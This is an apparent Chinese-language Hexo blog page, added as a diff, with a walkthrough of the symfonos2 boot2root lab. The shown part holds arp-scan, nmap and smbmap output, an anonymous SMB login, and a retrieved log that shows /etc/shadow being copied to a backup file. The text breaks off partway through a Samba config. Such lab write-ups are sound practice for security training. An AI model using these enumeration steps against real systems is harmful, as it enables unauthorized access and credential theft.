@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//fastly.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"192.168.6.128","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="symfonos2简介​    一道boot2root的综合靶场练习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="symfonos2">
+<meta property="og:url" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/index.html">
+<meta property="og:site_name" content="菜心">
+<meta property="og:description" content="symfonos2简介​    一道boot2root的综合靶场练习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/1.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/2.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/3.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/4.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/5.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/6.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/7.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/8.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/9.png">
+<meta property="og:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/10.png">
+<meta property="article:published_time" content="2021-03-27T08:34:14.000Z">
+<meta property="article:modified_time" content="2023-06-15T16:11:05.597Z">
+<meta property="article:author" content="菜心">
+<meta property="article:tag" content="入门">
+<meta property="article:tag" content="综合靶场测试">
+<meta property="article:tag" content="symfonos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/symfonos2/1.png">
+
+<link rel="canonical" href="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>symfonos2 | 菜心</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">菜心</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://192.168.6.128/2021/03/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/symfonos2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar1.gif">
+      <meta itemprop="name" content="菜心">
+      <meta itemprop="description" content="目标&&付出">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜心">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          symfonos2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-27 16:34:14" itemprop="dateCreated datePublished" datetime="2021-03-27T16:34:14+08:00">2021-03-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-16 00:11:05" itemprop="dateModified" datetime="2023-06-16T00:11:05+08:00">2023-06-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">靶场</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E5%9C%BA/symfonos/" itemprop="url" rel="index"><span itemprop="name">symfonos</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>20k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>18 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="symfonos2"><a href="#symfonos2" class="headerlink" title="symfonos2"></a>symfonos2</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
+<a id="more"></a>
+
+<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
+<li>kali2020</li>
+<li>symfonos2</li>
+<li>windows10</li>
+</ul>
+<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.43.86</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    fe:ee:df:63:84:20       (Unknown: locally administered)</span><br><span class="line">192.168.43.188  d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line">192.168.43.207  00:0c:29:14:45:41       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.953 seconds (131.08 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目标为 <code>192.168.43.207</code></li>
+<li><code>NMAP</code></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.207</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.207</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-27 03:06 EDT</span><br><span class="line">Nmap scan report for 192.168.43.207</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">Not shown: 65530 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)</span><br><span class="line">80/tcp  open  http        WebFS httpd 1.21</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 00:0C:29:14:45:41 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2021-03-27T02:06:23-05:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-27T07:06:23</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.79 ms 192.168.43.207</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>目录扫描</li>
+</ul>
+<p><img data-src="./symfonos2/1.png" alt></p>
+<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p><img data-src="./symfonos2/2.png" alt></p>
+<h3 id="Samba-smbmap"><a href="#Samba-smbmap" class="headerlink" title="Samba(smbmap)"></a>Samba(smbmap)</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.43.207</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# smbmap -H 192.168.43.207</span><br><span class="line">[+] Guest session       IP: 192.168.43.207:445  Name: 192.168.43.207                                    </span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        anonymous                                               READ ONLY</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 登录 smb</span></span><br><span class="line">smbclient //192.168.43.207/anonymous  --user=symfonos</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./symfonos2/3.png" alt></p>
+<ul>
+<li><code>log.txt</code>文件内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br></pre></td><td class="code"><pre><span class="line">root@symfonos2:~# cat &#x2F;etc&#x2F;shadow &gt; &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">root@symfonos2:~# cat &#x2F;etc&#x2F;samba&#x2F;smb.conf</span><br><span class="line">#</span><br><span class="line"># Sample configuration file for the Samba suite for Debian GNU&#x2F;Linux.</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># This is the main Samba configuration file. You should read the</span><br><span class="line"># smb.conf(5) manual page in order to understand the options listed</span><br><span class="line"># here. Samba has a huge number of configurable options most of which </span><br><span class="line"># are not shown in this example</span><br><span class="line">#</span><br><span class="line"># Some options that are often worth tuning have been included as</span><br><span class="line"># commented-out examples in this file.</span><br><span class="line">#  - When such options are commented with &quot;;&quot;, the proposed setting</span><br><span class="line">#    differs from the default Samba behaviour</span><br><span class="line">#  - When commented with &quot;#&quot;, the proposed setting is the default</span><br><span class="line">#    behaviour of Samba but the option is considered important</span><br><span class="line">#    enough to be mentioned here</span><br><span class="line">#</span><br><span class="line"># NOTE: Whenever you modify this file you should run the command</span><br><span class="line"># &quot;testparm&quot; to check that you have not made any basic syntactic </span><br><span class="line"># errors. </span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Global Settings &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line">## Browsing&#x2F;Identification ###</span><br><span class="line"></span><br><span class="line"># Change this to the workgroup&#x2F;NT-domain name your Samba server will part of</span><br><span class="line">   workgroup &#x3D; WORKGROUP</span><br><span class="line"></span><br><span class="line"># Windows Internet Name Serving Support Section:</span><br><span class="line"># WINS Support - Tells the NMBD component of Samba to enable its WINS Server</span><br><span class="line">#   wins support &#x3D; no</span><br><span class="line"></span><br><span class="line"># WINS Server - Tells the NMBD components of Samba to be a WINS Client</span><br><span class="line"># Note: Samba can be either a WINS Server, or a WINS Client, but NOT both</span><br><span class="line">;   wins server &#x3D; w.x.y.z</span><br><span class="line"></span><br><span class="line"># This will prevent nmbd to search for NetBIOS names through DNS.</span><br><span class="line">   dns proxy &#x3D; no</span><br><span class="line"></span><br><span class="line">#### Networking ####</span><br><span class="line"></span><br><span class="line"># The specific set of interfaces &#x2F; networks to bind to</span><br><span class="line"># This can be either the interface name or an IP address&#x2F;netmask;</span><br><span class="line"># interface names are normally preferred</span><br><span class="line">;   interfaces &#x3D; 127.0.0.0&#x2F;8 eth0</span><br><span class="line"></span><br><span class="line"># Only bind to the named interfaces and&#x2F;or networks; you must use the</span><br><span class="line"># &#39;interfaces&#39; option above to use this.</span><br><span class="line"># It is recommended that you enable this feature if your Samba machine is</span><br><span class="line"># not protected by a firewall or is a firewall itself.  However, this</span><br><span class="line"># option cannot handle dynamic or non-broadcast interfaces correctly.</span><br><span class="line">;   bind interfaces only &#x3D; yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 